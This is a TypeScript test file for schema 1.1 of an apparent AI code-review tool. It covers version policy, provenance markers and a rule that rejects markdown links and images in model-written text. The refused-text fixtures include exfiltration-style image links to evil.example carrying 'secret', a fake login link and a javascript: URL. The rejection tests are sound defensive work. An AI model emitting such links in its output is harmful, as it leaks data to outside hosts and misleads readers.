import { describe, expect, it } from "vitest";
import { isSupportedVersion, SCHEMA_VERSION } from "./document.js";
import { textProblem } from "./primitives.js";
import { expectAccepted, expectRejected, pr847 } from "./test-helpers.js";

/**
 * Schema 1.1 (P4-4 review round 1, ADR 0015): two pipeline-owned provenance markers and a rule
 * against markdown links and images in model-written text.
 */

const AUTH = "src/auth/invitations.ts";
const PAGE = "web/src/pages/InvitePage.tsx";

describe("schema 1.1: version policy", () => {
  it("is 1.1.0 and still reads 1.0 documents, but no newer minor", () => {
    expect(SCHEMA_VERSION).toBe("1.1.0");
    expect(isSupportedVersion("1.0.0")).toBe(true);
    expect(isSupportedVersion("1.1.3")).toBe(true);
    expect(isSupportedVersion("1.2.0")).toBe(false);
    expect(isSupportedVersion("1.10.0")).toBe(false);
    const doc = pr847();
    doc.schemaVersion = "1.0.0";
    expectAccepted(doc);
  });
});

describe("schema 1.1: provenance.briefingUnavailable", () => {
  it("records why Rocky wrote the briefing itself", () => {
    const doc = pr847();
    doc.provenance.briefingUnavailable = { reason: "analysis-failed" };
    expect(expectAccepted(doc).provenance.briefingUnavailable).toEqual({
      reason: "analysis-failed",
    });
    for (const reason of ["timeout", "too-large"]) {
      const other = pr847();
      other.provenance.briefingUnavailable = { reason } as never;
      expectAccepted(other);
    }
  });

  it("takes only its fixed reasons and no model text", () => {
    const doc = pr847();
    doc.provenance.briefingUnavailable = { reason: "approved" } as never;
    expectRejected(doc, "INVALID_SHAPE", "provenance.briefingUnavailable.reason");
    const extra = pr847();
    extra.provenance.briefingUnavailable = { reason: "timeout", detail: "x" } as never;
    expectRejected(extra, "INVALID_SHAPE", "provenance.briefingUnavailable");
  });
});

describe("schema 1.1: provenance.readByHand", () => {
  it("lists triaged files the AI reviewed and found nothing in", () => {
    const doc = pr847();
    doc.findings = doc.findings.filter((f) => f.path !== AUTH);
    doc.briefing.verdict.level = "critical";
    doc.provenance.readByHand = [{ path: AUTH }];
    expect(expectAccepted(doc).provenance.readByHand).toEqual([{ path: AUTH }]);
  });

  it("defaults to empty", () => {
    expect(expectAccepted(pr847()).provenance.readByHand).toEqual([]);
  });

  it("refuses a file outside the PR, an untriaged file, a file with findings, or a repeat", () => {
    const unknown = pr847();
    unknown.provenance.readByHand = [{ path: "src/other.ts" }];
    expectRejected(unknown, "UNKNOWN_FILE", "provenance.readByHand[0].path");

    const noise = pr847();
    noise.provenance.readByHand = [{ path: "pnpm-lock.yaml" }];
    expectRejected(noise, "READ_BY_HAND_MISMATCH", "provenance.readByHand[0].path");

    const withFindings = pr847();
    withFindings.provenance.readByHand = [{ path: AUTH }];
    expectRejected(withFindings, "READ_BY_HAND_MISMATCH", "provenance.readByHand[0].path");

    const twice = pr847();
    twice.findings = twice.findings.filter((f) => f.path !== PAGE);
    twice.provenance.readByHand = [{ path: PAGE }, { path: PAGE }];
    expectRejected(twice, "DUPLICATE_PATH", "provenance.readByHand[1].path");
  });
});

describe("schema 1.1: no markdown links or images in model text", () => {
  const refused = [
    "See ![x](https://evil.example/leak?d=secret).",
    "![alt][ref]",
    "Click [here](https://evil.example/login).",
    "Click [here]( //evil.example/x ).",
    "Visit <https://evil.example/x> now.",
    "[ref]: https://evil.example/x",
    "Mail [me](mailto:a@evil.example).",
    "[x](javascript:alert(1))",
  ];
  const allowed = [
    "Calls `handlers[name](req)` without a check.",
    "The array `a[0](b)` is a call.",
    "Use `Array<string>` here.",
    "Returns `!flag` when unset.",
    "The URL `https://api.example.com` is hard-coded.",
    "See [the docs] for more.",
    "Use [`ok`](./README.md)? no, a relative link is fine.",
  ];

  it("refuses images, absolute links, autolinks and link definitions in prose, lines and agent prompts", () => {
    for (const kind of ["prose", "line", "strict"] as const)
      for (const text of refused)
        expect(textProblem(text, kind), `${kind}: ${text}`).toMatch(/link|image/);
  });

  it("allows code that only looks like links, and code lines keep everything", () => {
    for (const text of allowed) expect(textProblem(text, "prose"), text).toBeUndefined();
    for (const text of refused) expect(textProblem(text, "code"), text).toBeUndefined();
  });

  it("is enforced on stored findings", () => {
    const doc = pr847();
    doc.findings[0]!.body = "Exfiltrate: ![x](https://evil.example/p.png)";
    expectRejected(doc, "INVALID_SHAPE", "findings[0].body");
  });
});
